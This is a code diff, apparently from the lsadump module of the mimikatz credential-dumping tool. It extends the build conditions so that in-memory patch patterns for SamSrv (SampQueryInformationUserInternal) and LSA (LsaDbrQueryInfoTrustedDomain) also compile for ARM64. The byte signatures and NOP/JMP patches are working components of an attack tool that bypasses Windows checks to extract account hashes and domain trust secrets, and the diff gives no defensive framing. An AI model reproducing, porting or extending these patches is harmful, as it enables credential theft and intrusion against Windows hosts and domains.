@@ -1201,7 +1201,7 @@ BOOL kuhl_m_lsadump_sec_aes256(PNT6_HARD_SECRET hardSecretBlob, DWORD hardSecret
 	return status;
 }
 
-#ifdef _M_X64
+#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
 BYTE PTRN_WALL_SampQueryInformationUserInternal[]	= {0x49, 0x8d, 0x41, 0x20};
 BYTE PATC_WIN5_NopNop[]								= {0x90, 0x90};
 BYTE PATC_WALL_JmpShort[]							= {0xeb, 0x04};
@@ -1214,7 +1214,7 @@ KULL_M_PATCH_GENERIC SamSrvReferences[] = {
 	{KULL_M_WIN_BUILD_10_1709,	{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-21}},
 	{KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-24}},
 };
-#elif defined _M_IX86
+#elif defined(_M_IX86)
 BYTE PTRN_WALL_SampQueryInformationUserInternal[]	= {0xc6, 0x40, 0x22, 0x00, 0x8b};
 BYTE PATC_WALL_JmpShort[]							= {0xeb, 0x04};
 KULL_M_PATCH_GENERIC SamSrvReferences[] = {
@@ -1630,12 +1630,12 @@ void kuhl_m_lsadump_trust_authinformation(PLSA_AUTH_INFORMATION info, DWORD coun
 }
 
 BYTE PATC_WALL_LsaDbrQueryInfoTrustedDomain[] = {0xeb};
-#ifdef _M_X64
+#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
 BYTE PTRN_WALL_LsaDbrQueryInfoTrustedDomain[] = {0xbb, 0x03, 0x00, 0x00, 0xc0, 0xe9};
 KULL_M_PATCH_GENERIC QueryInfoTrustedDomainReferences[] = {
 	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WALL_LsaDbrQueryInfoTrustedDomain),	PTRN_WALL_LsaDbrQueryInfoTrustedDomain},	{sizeof(PATC_WALL_LsaDbrQueryInfoTrustedDomain),	PATC_WALL_LsaDbrQueryInfoTrustedDomain},	{-11}},
 };
-#elif defined _M_IX86
+#elif defined(_M_IX86)
 BYTE PTRN_WALL_LsaDbrQueryInfoTrustedDomain[] = {0xc7, 0x45, 0xfc, 0x03, 0x00, 0x00, 0xc0, 0xe9};
 KULL_M_PATCH_GENERIC QueryInfoTrustedDomainReferences[] = {
 	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WALL_LsaDbrQueryInfoTrustedDomain),	PTRN_WALL_LsaDbrQueryInfoTrustedDomain},	{sizeof(PATC_WALL_LsaDbrQueryInfoTrustedDomain),	PATC_WALL_LsaDbrQueryInfoTrustedDomain},	{-10}},
